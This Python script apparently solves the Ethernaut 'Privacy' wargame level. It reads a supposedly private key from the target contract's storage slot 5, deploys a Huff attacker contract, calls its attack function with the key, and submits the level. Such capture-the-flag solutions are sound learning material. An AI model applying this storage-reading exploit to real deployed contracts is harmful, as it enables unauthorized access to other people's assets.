from ape import accounts, chain
from ..utils.helper import (
    get_level_instance,
    level_completed,
    deploy_huff_contract,
    get_sig,
    send_tx,
)

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0xcAac6e4994c2e21C5370528221c226D1076CfDAB"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Huff Huff... Deploying hacker contract ---\n")
    hacker = deploy_huff_contract("Privacy.huff", instance, user)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")

    print("\n--- The key is stored at slot 5 in the instance ---\n")

    key = chain.provider.get_storage_at(instance, 5)

    print(f"\n--- The value at slot 5 is: {key.hex()} ---\n")

    calldata = get_sig("attack(bytes16)") + key.hex()[2:]
    send_tx(user, hacker, calldata)

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
